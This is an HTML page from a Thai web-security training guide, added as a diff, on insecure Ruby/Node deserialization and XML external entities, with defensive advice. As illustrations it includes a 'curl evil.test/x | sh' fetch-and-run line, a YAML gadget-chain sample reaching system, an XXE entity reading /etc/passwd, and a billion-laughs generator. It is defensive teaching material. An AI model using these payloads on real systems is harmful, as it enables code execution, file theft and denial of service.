@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="th" data-lang="rails">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>14 Deserialization and XXE · Web Security</title>
+<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@400;600&display=swap" rel="stylesheet">
+<link rel="icon" href="../favicon.ico" sizes="32x32">
+<link rel="icon" href="../favicon.svg" type="image/svg+xml">
+<link rel="apple-touch-icon" href="../apple-touch-icon.png">
+<link rel="manifest" href="../site.webmanifest">
+<meta name="theme-color" content="#000000">
+<link rel="stylesheet" href="../assets/site.css?v=8f1e007517">
+<script src="../assets/consent.js?v=9320b4a322"></script>
+</head>
+<body data-slug="14-deserialization-and-xxe">
+<div class="win">
+  <div class="titlebar"><span class="dots"><i></i><i></i><i></i></span><span class="t">guest@websec: ~/websec/14-deserialization-and-xxe/th — zsh — 100×40</span>
+    <a class="by" href="about.html" title="เกี่ยวกับผู้เขียน"><span class="w0">เขียนโดย </span>SaKKo</a>
+    <span class="lsw" role="group" aria-label="ภาษา"><a href="../14-deserialization-and-xxe.html" data-setlang="en">EN</a><a href="14-deserialization-and-xxe.html" aria-current="true" data-setlang="th">TH</a></span>
+    <span class="langsw" role="group" aria-label="Code examples language"><span class="d">โค้ด:</span><button type="button" data-l="rails">rails</button><button type="button" data-l="node">node</button></span></div>
+  <nav class="top" aria-label="Sections"><a href="index.html" title="คู่มือความปลอดภัยเว็บแอปพลิเคชัน">~/</a>
+<a class="trk on" href="index.html#security">#1 ความปลอดภัย</a>
+<a class="trk" href="r01-rails-api-app.html">#2 rails</a>
+<span class="grp">|</span>
+<a href="01-introduction.html" title="บทนำ">01·บทนำ</a>
+<a href="02-sql-injection.html" title="SQL Injection">02·sql</a>
+<a href="03-unsafe-query-generation.html" title="การสร้าง query ที่ไม่ปลอดภัย">03·query</a>
+<a href="04-xss-and-other-injection.html" title="XSS และ injection แบบอื่น">04·xss</a>
+<span class="grp">| บัญชี:</span>
+<a href="05-authentication.html" title="การยืนยันตัวตน">05·auth</a>
+<a href="05b-mfa.html" title="การยืนยันตัวตนหลายปัจจัย">05b·mfa</a>
+<a href="06-sessions.html" title="Session">06·session</a>
+<a href="07-csrf.html" title="Cross-Site Request Forgery">07·csrf</a>
+<a href="08-user-management.html" title="การจัดการผู้ใช้">08·ผู้ใช้</a>
+<a href="09-mass-assignment-and-authorization.html" title="Mass Assignment และ Authorization">09·authz</a>
+<span class="grp">| เบราว์เซอร์:</span>
+<a href="10-redirection-and-files.html" title="Redirect และไฟล์">10·ไฟล์</a>
+<a href="11-http-security-headers.html" title="HTTP Security Header">11·header</a>
+<a href="12-transport-cookies-third-party.html" title="การรับส่งข้อมูล คุกกี้ และสคริปต์บุคคลที่สาม">12·คุกกี้</a>
+<span class="grp">| เซิร์ฟเวอร์:</span>
+<a href="13-ssrf.html" title="Server-Side Request Forgery">13·ssrf</a>
+<a href="14-deserialization-and-xxe.html" aria-current="page" title="Deserialization และ XXE">14·deserialize</a>
+<a href="15-environmental-security.html" title="ความปลอดภัยของสภาพแวดล้อม">15·secret</a>
+<a href="16-cryptography.html" title="การเข้ารหัสและการปกป้องข้อมูล">16·crypto</a>
+<a href="17-dependencies-and-cves.html" title="Dependency และ CVE">17·dependency</a>
+<span class="grp">| ดูแลระบบ:</span>
+<a href="18-intranet-and-admin.html" title="ความปลอดภัยของ intranet และ admin">18·admin</a>
+<a href="19-misconfiguration-and-errors.html" title="การตั้งค่าผิดพลาดและการจัดการ error">19·config</a>
+<a href="20-insecure-design.html" title="การออกแบบที่ไม่ปลอดภัยและ business logic">20·design</a>
+<a href="21-logging-and-incident-response.html" title="Logging การแจ้งเตือน และการรับมือเหตุการณ์">21·logging</a>
+<a href="22-additional-resources.html" title="แหล่งข้อมูลเพิ่มเติม">22·แหล่งข้อมูล</a>
+<span class="grp">| แบบสอบถาม:</span>
+<a href="q1-developer-survey.html" title="แบบสำรวจความปลอดภัยสำหรับนักพัฒนา">Q1·dev</a>
+<a href="q2-awareness-survey.html" title="แบบสำรวจความตระหนักรู้ภัยไซเบอร์">Q2·ทุกคน</a></nav>
+  <main>
+<div class="col">
+<p class="prompt">guest@websec ~ % <b>man 14-deserialization-and-xxe</b></p>
+<h1>14 · Deserialization และ XXE</h1>
+<p class="lede">รูปแบบข้อมูลบางแบบสร้าง object อะไรก็ได้ อ่านไฟล์ได้ หรือขยายเป็นหลายกิกะไบต์ ถ้า parse จากคนแปลกหน้า input จะเป็นคนกำหนดว่าเซิร์ฟเวอร์ทำอะไร</p>
+<h2>14.1 Deserialization ที่ไม่ปลอดภัย</h2>
+<p>JSON สร้างได้แค่ข้อมูลธรรมดา แต่ <code>Marshal</code> ของ Ruby และ YAML ที่มีแท็ก object สร้าง <i>class อะไรก็ได้</i></p>
+<p>ผู้โจมตีจึงเลือกได้ว่าจะสร้าง object อะไร ร้อย class ธรรมดาไม่กี่ตัวเข้าด้วยกัน ก็รันโค้ดได้จาก request เดียว</p>
+<div class="warn">Rails โดนเรื่องนี้ในปี 2013: POST เดียวยึดแอป Rails ตัวไหนบนอินเทอร์เน็ตก็ได้</div>
+<div class="anim" data-actors="Attacker|Rails app|Ruby runtime" data-title="จาก deserialization สู่การรันโค้ด"><script type="application/json">[{"f": 0, "t": 1, "l": "cookie / param / upload containing a Marshal or YAML payload", "k": "a", "c": "ผู้โจมตีส่งข้อมูลที่ serialize แล้วซึ่งบรรยาย object ไม่ใช่แค่ค่า"}, {"n": 1, "l": "Marshal.load(data) / YAML.unsafe_load(data)", "k": "a", "c": "โค้ดของเราสร้าง object ตามที่ไบต์บรรยายไว้ขึ้นมาใหม่"}, {"f": 1, "t": 2, "l": "instantiate gadget classes from loaded gems", "k": "a", "c": "class ธรรมดาถูกร้อยต่อกันจนโค้ดตอนเริ่มต้นหรือเก็บกวาดไปเรียกสิ่งอันตราย"}, {"n": 2, "l": "system(\"curl evil.test/x | sh\")", "k": "a", "c": "<b>Remote code execution<\/b> โดยไม่ต้องมีบั๊กในตรรกะของเราเลย"}, {"n": 1, "l": "JSON.parse / YAML.safe_load", "k": "k", "c": "parser ที่ปลอดภัยสร้างแค่ชนิดข้อมูลพื้นฐาน และปฏิเสธแท็ก object"}]</script></div>
+<div class="demo"><header><b>sim: การโหลดเอกสาร YAML</b><span>จำลองพฤติกรรมของ Psych ด้วยการจับรูปแบบ</span></header><div class="body">
+<label for="ym-in">YAML จาก request</label>
+<textarea id="ym-in" rows="6">--- !ruby/object:Gem::Installer
+i: x
+--- !ruby/object:Gem::SpecFetcher
+i: y
+--- !ruby/object:Gem::Requirement
+requirements: !ruby/object:Gem::Package::TarReader
+  io: &amp;1 !ruby/object:Net::BufferedIO
+    debug_output: !ruby/object:Net::WriteAdapter
+      method_id: :system</textarea>
+<div class="row" style="margin-top:8px"><button class="btn" data-ym="name: Ana
+tags: [admin, beta]
+limit: 10" type="button">plain data</button><button class="btn" data-ym="created: 2026-11-14" type="button">a date</button><button class="btn" data-ym="--- !ruby/object:Gem::Installer
+i: x
+--- !ruby/object:Net::WriteAdapter
+  method_id: :system" type="button">gadget chain</button></div>
+<div class="grid3" style="margin-top:10px">
+<div class="box"><p class="cap r">YAML.unsafe_load</p><div class="out" id="ym-a"></div></div>
+<div class="box"><p class="cap g">YAML.load (Psych 4+, Ruby 3.1+)</p><div class="out" id="ym-b"></div></div>
+<div class="box"><p class="cap g">JSON.parse</p><div class="out" id="ym-c"></div></div>
+</div></div></div>
+<p>วิธีป้องกัน:</p>
+<ul>
+<li>ใช้ <b>JSON</b> กับทุกอย่างที่มาจากภายนอก</li>
+<li>ต้องรับ YAML จากผู้ใช้? ใช้ <code>YAML.safe_load</code></li>
+<li>ห้าม <code>Marshal.load</code> ข้อมูลที่ไม่น่าเชื่อถือ</li>
+
+</ul>
+<div class="rp partial">Rails สมัยใหม่ปลอดภัยโดยค่าเริ่มต้น: คุกกี้แบบ JSON ไม่ parse XML params และ YAML แบบปลอดภัย <b>ตรวจแอปเก่า</b> ว่ามี cookie serializer แบบ <code>:marshal</code> หรือ <code>Marshal.load</code> ไหม</div><div class="code">
+<pre data-lang="rails"><span class="c"># safe by default on Ruby 3.1+ (Psych 4)</span>
+YAML.load(user_yaml)                                        <span class="c"># plain types only</span>
+YAML.safe_load(user_yaml, permitted_classes: [Date, Symbol])
+JSON.parse(user_json)
+
+<span class="bad">YAML.unsafe_load(user_yaml)        # arbitrary objects</span>
+<span class="bad">Marshal.load(Base64.decode64(params[:state]))   # RCE</span>
+
+<span class="c"># config/initializers/cookies_serializer.rb (older apps: check this!)</span>
+Rails.application.config.action_dispatch.cookies_serializer = :json</pre>
+<pre data-lang="node"><span class="c">// JS: JSON.parse is data-only. Danger comes from libraries that revive objects</span>
+JSON.parse(body);                                   <span class="ok">// plain data</span>
+<span class="bad">require("node-serialize").unserialize(body);        // has executed functions (CVE-2017-5941)</span>
+<span class="bad">yaml.load(text)                                     // js-yaml 3.x: can build functions (4.x is safe)</span></pre>
+</div>
+<h2>14.2 XML External Entities (XXE)</h2>
+<p>XML ชี้ไปยังไฟล์ภายนอกได้ parser ที่ไม่ระวังจะอ่าน <code>/etc/passwd</code> แล้วส่งกลับมา หรือขยายไฟล์ 1 KB เป็นหลายกิกะไบต์</p>
+<p>XML ซ่อนอยู่ใน SAML, RSS, SVG และไฟล์ Office</p>
+<div class="anim" data-actors="Attacker|Rails app (XML import)|Server filesystem" data-title="XXE อ่านไฟล์บนเซิร์ฟเวอร์"><script type="application/json">[{"f": 0, "t": 1, "l": "upload: <!ENTITY x SYSTEM \"file:///etc/passwd\"> … <name>&x;<\/name>", "k": "a", "c": "ไฟล์ XML ที่อัปโหลดประกาศ external entity และใช้มันในฟิลด์หนึ่ง"}, {"n": 1, "l": "parser with NOENT / DTDLOAD enabled", "k": "a", "c": "ตัวเลือกบางอย่างของ parser สั่งให้แทนค่า external entity"}, {"f": 1, "t": 2, "l": "read /etc/passwd", "k": "a", "c": "parser อ่านไฟล์บนเซิร์ฟเวอร์"}, {"f": 1, "t": 0, "l": "\"Imported contact: root:x:0:0:…\"", "k": "a", "c": "เนื้อหาของไฟล์กลับมาอยู่ในข้อมูลที่นำเข้า"}, {"n": 1, "l": "Nokogiri defaults: no entity substitution, no network", "k": "k", "c": "ด้วยตัวเลือกเริ่มต้นของ Nokogiri entity ยังคงเป็นการอ้างอิงที่ไม่ถูกแทนค่า"}]</script></div>
+<div class="demo"><header><b>sim: billion laughs</b><span>entity ซ้อนกันระเบิดออกได้อย่างไร</span></header><div class="body">
+<div class="row"><label for="bl-lv">จำนวนชั้นที่ซ้อน</label><input id="bl-lv" max="10" min="1" style="flex:1;accent-color:var(--fg)" type="range" value="9"/><span id="bl-lvv"></span></div>
+<pre class="plain" id="bl-doc" style="margin-top:8px;font-size:12px"></pre>
+<div class="out" id="bl-out" style="margin-top:8px"></div>
+</div></div>
+<div class="rp yes">Nokogiri ปลอดภัยโดยค่าเริ่มต้น แค่อย่าส่ง <code>noent</code> หรือ <code>dtdload</code></div><div class="code">
+<pre data-lang="rails">doc = Nokogiri::XML(upload.read)                 <span class="c"># safe defaults</span>
+doc = Nokogiri::XML(upload.read) { |c| c.strict.nonet }
+
+<span class="bad">Nokogiri::XML(xml) { |c| c.noent.dtdload }        # enables XXE</span>
+<span class="bad">Nokogiri::XML(xml, nil, nil, Nokogiri::XML::ParseOptions::NOENT)</span></pre>
+</div>
+</div>
+
+<div class="col"><label class="readmark"><input type="checkbox" id="read-14-deserialization-and-xxe"> ทำเครื่องหมายว่าอ่านหัวข้อ 14 แล้ว</label><div class="pager"><a href="13-ssrf.html">◀ 13 Server-Side Request Forgery</a><a href="15-environmental-security.html">15 ความปลอดภัยของสภาพแวดล้อม ▶</a></div></div>
+  </main>
+  <footer class="site">อ้างอิงจาก <a href="https://guides.rubyonrails.org/security.html">Ruby on Rails Security Guide</a> (CC BY-SA 4.0), <a href="https://cheatsheetseries.owasp.org/">OWASP Cheat Sheet Series</a>, <a href="https://owasp.org/Top10/2025/">OWASP Top 10:2025</a> และ <a href="https://infosec.mozilla.org/guidelines/web_security.html">Mozilla Web Security Guidelines</a> เขียนสำหรับทีมพัฒนาของเรา ตัวอย่างโค้ดเพื่อการอธิบาย ข้อความในผลการจำลองบางส่วนยังเป็นภาษาอังกฤษ</footer>
+</div>
+<script src="../assets/site.js?v=92ac7aa3f8"></script>
+<script>
+
+function ym() {
+  const v = $("#ym-in").value, tags = [...v.matchAll(/!ruby\/(object|hash|struct|marshal):?([\w:]*)/g)].map(m => m[2] || m[1]);
+  const hasDate = /\d{4}-\d{2}-\d{2}/.test(v);
+  if (tags.length) {
+    $("#ym-a").innerHTML = tags.map(t => `<span class="r">instantiates ${esc(t)}</span>`).join("\n") + (tags.some(t => /WriteAdapter|BufferedIO|TarReader/.test(t)) ? '\n<span class="r">→ gadget chain reaches Kernel#system: code execution</span>' : "");
+    $("#ym-b").innerHTML = `<span class="g">Psych::DisallowedClass:\nTried to load unspecified class: ${esc(tags[0])}</span>`;
+  } else {
+    $("#ym-a").innerHTML = '<span class="y">loads plain data (fine here, dangerous by design)</span>';
+    $("#ym-b").innerHTML = hasDate ? '<span class="y">Psych::DisallowedClass: Date\n(add permitted_classes: [Date])</span>' : '<span class="g">loads plain data</span>';
+  }
+  $("#ym-c").innerHTML = '<span class="g">only strings, numbers, booleans, null, arrays, hashes exist in JSON: no objects to instantiate</span>';
+}
+$("#ym-in").addEventListener("input", ym); $$("[data-ym]").forEach(b => b.onclick = () => { $("#ym-in").value = b.dataset.ym; ym(); }); ym();
+function blf() {
+  const n = +$("#bl-lv").value; $("#bl-lvv").textContent = n;
+  let d = '<?xml version="1.0"?>\n<!DOCTYPE lolz [\n  <!ENTITY lol0 "lol">\n';
+  for (let i = 1; i <= n; i++) d += `  <!ENTITY lol${i} "${Array(10).fill("&lol" + (i - 1) + ";").join("")}">\n`;
+  d += `]>\n<lolz>&lol${n};</lolz>`;
+  $("#bl-doc").textContent = d;
+  const bytes = 3 * Math.pow(10, n), fmt = b => b >= 1e9 ? (b / 1e9).toFixed(1) + " GB" : b >= 1e6 ? (b / 1e6).toFixed(1) + " MB" : b >= 1e3 ? (b / 1e3).toFixed(1) + " KB" : b + " B";
+  $("#bl-out").innerHTML = `document size: ${d.length} bytes → expands to <b>${fmt(bytes)}</b> (${(10 ** n).toLocaleString()} copies of "lol")` + (bytes > 1e8 ? '\n<span class="r">enough to exhaust a server\'s memory</span>' : "") + '\n<span class="d">defense: disable DTDs / entity expansion (Nokogiri default), limit upload size</span>';
+}
+$("#bl-lv").addEventListener("input", blf); blf();
+
+</script>
+</body>
+</html>
